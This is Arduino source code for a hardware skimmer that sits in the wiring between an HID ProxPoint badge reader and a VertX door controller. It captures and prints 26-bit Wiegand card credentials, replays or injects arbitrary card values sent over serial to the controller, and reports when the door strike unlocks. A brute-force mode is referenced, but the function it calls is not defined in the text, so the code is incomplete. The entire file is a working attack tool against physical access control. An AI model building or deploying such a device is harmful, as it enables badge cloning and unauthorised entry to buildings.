/* HID ProxPoint Skimmer
*  Brad Antoniewicz
*
* This is a prototype for a skimmer that sits between a
* HID ProxPoint reader and a VertX Controller
* 
* It will take data recieved from the Reader, print it 
* and send it to the controller
* It will also take data recieved from the Serial interface
* on the Arduino (in Binary) and send it to the controller
* 
* Arduino Pinouts:
*        2 - ProxPoint Green (DATA 0)
*        3 - ProxPoint White (DATA 1)
*        8 - Output to VertX Data 0 (Green)
*        9 - Output to VertX Data 1 (White)
*        11 - VertX Strike Relay NO 1
*        12 - VertX Strike Relay NO 2
*        13 - LED
*        5V - To ProxPoint Red
*        GND - To ProxPoint Black
*        GND - To VertX Ground (Black)
*
*  All of the Remaining ProxPoint wires can be plugged into the VertX
*  or left out.
*
* 26-Bit Wiegant Format: 
* Bit 1 = Even Parity over Bits 2 - 13
* Bits 2 - 9 = Facility Code (0 to 255) Bit 2 is MSB
* Bits 10 - 25 = ID Number (0 to 65,535) Bit 10 is MSB
* Bits 26 Odd parity over bits 14 to 25
*
*
* Disclaimer - I know this code is REALLY sloppy and inefficient
*          Please don't judge me :)
*/

#define CARD_LEN 26
#define LED 13   // output LED
#define VX_D0 8  // output DATA0 (Green) to Controller
#define VX_D1 9  // output DATA1 (White) to Controller
#define VX_NO1 11 // input VertX Strike Relay NO 1
#define VX_NO2 12 // input VertX Strike Relay NO 2

unsigned long cardValue = 0;

int incomingByte = 0; 
int sInputCount = 0;

/*

  This code is for processing data from the reader - Thanks Mike Cook!

*/
volatile unsigned long reader1 = 0;
volatile int reader1Count = 0;

void reader1One(void) {
  reader1Count++;
  reader1 = reader1 << 1;
  reader1 |= 1;
}

void reader1Zero(void) {
  reader1Count++;
  reader1 = reader1 << 1;
}

void isr(int action) {
  if ( action == 1 ) { // Start
    /* Crazy People Timing and ISR -- Thanks Mike Cook! */
      attachInterrupt(0, reader1Zero, FALLING);//DATA0 to pin 2
      attachInterrupt(1, reader1One, FALLING); //DATA1 to pin 3
      delay(10); 
  } else { // Stop
      detachInterrupt(0);
      detachInterrupt(1);
  }
     
}

// END Reader In

void resetState() {
  Serial.println("[+] Reseting State...");
  delay(10);
  Serial.flush();
  sInputCount=0;
  reader1 = 0;
  reader1Count=0;
}

void writeCard(volatile unsigned long sendValue) {
    Serial.println("[-] Sending Data:");
    Serial.print("\t");
    for (short x=CARD_LEN; x>=0; x--) {
      if ( bitRead(sendValue,x) == 1 ) {
        Serial.print("1"); 
        digitalWrite(VX_D1, LOW);
        delayMicroseconds(34);
        digitalWrite(VX_D1, HIGH);
      } else if ( bitRead(sendValue,x) == 0 ) {
        Serial.print("0");
        digitalWrite(VX_D0, LOW);
        delayMicroseconds(34);
        digitalWrite(VX_D0, HIGH);
      }
      delay(2);
    }
    Serial.println();
}

void processInput(int byte) {
   if (byte == 49) { // DECIMAL 1 
     sInputCount++; 
     bitSet(cardValue, CARD_LEN - sInputCount);
  } else if (byte == 48) { // DECIMAL 0
     sInputCount++; 
     bitClear(cardValue, CARD_LEN - sInputCount);
  } else if (byte == 98 || byte == 66) { // b or B
      Serial.println("[-] Entering Brute Force Mode, provide starting value:");
     doDecBrute();
  } else {
      Serial.print("[!] Recieved invalid Value:");
      Serial.println(byte);
      resetState();
     }
}

void printCardData(unsigned long data) {
    int serialNumber = (data >> 1) & 0x3fff;
    int siteCode = (data >> 17) & 0x3ff;
    Serial.print("\tH: ");
    Serial.print(data,HEX);
    Serial.print(" SC: ");
    Serial.print(siteCode);
    Serial.print(" C: ");
    Serial.println(serialNumber);
    Serial.print("\tB: ");
    Serial.println(data, BIN);
}

void setup()
{
  
   /* This stuff is for the Door Sensor LED */
  pinMode(LED, OUTPUT); 
  digitalWrite(LED, LOW); 
  digitalWrite(LED, HIGH); 
  pinMode(VX_NO1, INPUT); // Reader 1
  pinMode(VX_NO2, INPUT); // Reader 2
  // End Door Sensor Stuff
  
  /* Reader In - */
  isr(0);
  isr(1);

   for(int i = 2; i<4; i++){
    pinMode(i, OUTPUT);
    digitalWrite(i, HIGH); // enable internal pull up causing a one
    digitalWrite(i, LOW); // disable internal pull up causing zero and thus an interrupt
    pinMode(i, INPUT);
    digitalWrite(i, HIGH); // enable internal pull up
  }
  delay(10);
  reader1 = 0;
  reader1Count = 0;

  //End Reader In

  pinMode(VX_D0,OUTPUT);
  digitalWrite(VX_D0, HIGH);

  pinMode(VX_D1,OUTPUT);
  digitalWrite(VX_D1, HIGH);
  
  sInputCount = 0; 
  Serial.begin(38400);
  Serial.println("Please provide a tag value");
  Serial.println("For Binary input, it must be 26 bits long");
  Serial.println("No parity needs, just add two 0's to the beginning");
  Serial.println("e.g. 00001001100011111110010101");
}

void loop() {
  
  /* This stuff is for the Door Sensor LED */
  int reader1Status = digitalRead(VX_NO1);
  int reader2Status = digitalRead(VX_NO2);
  if ( reader1Status == HIGH || reader2Status == HIGH ) {
    Serial.println("---  D o o r  U n l o c k e d ---");
    digitalWrite(LED, LOW);
    delay(4000);
    digitalWrite(LED, HIGH);
   } 
  // End Door Sensor Stuff
  
/* Start Serial In
  
    All this stuff does is accept input via the serial interface
*/
  if (Serial.available() > 0 ) {
    
    incomingByte = Serial.read();
    Serial.print(".");
    delay(10);

    processInput(incomingByte);
    if ( ( sInputCount > 0 ) && ( sInputCount != CARD_LEN ) && ( Serial.peek() == -1 ) ) {
          Serial.println("\n[!] Invalid Input Length!");
          resetState();
        }
     }
  if (sInputCount == CARD_LEN) {
      Serial.println("");
          Serial.println("[-] Sending current Serial Buffer");
          writeCard(cardValue); 
          resetState();
     } else if (sInputCount > CARD_LEN) {
          Serial.println("[!] Sorry, looks like your input was too long.. ");
          resetState();
      }
      
// End Serial In

/* Start Reader IN
    
     All this stuff does is take data in from the reader
     then send it to the controller
*/
       
if(reader1Count >= 26){
    Serial.println("");
    Serial.println("[+] Recieved input from Reader:");
    Serial.println("-------------------------------");
    printCardData(reader1);

    Serial.println("[+] Sending input to Controller:");
    writeCard(reader1);
    resetState();
    Serial.println("-------------------------------");
    }
   // END Reader IN
}

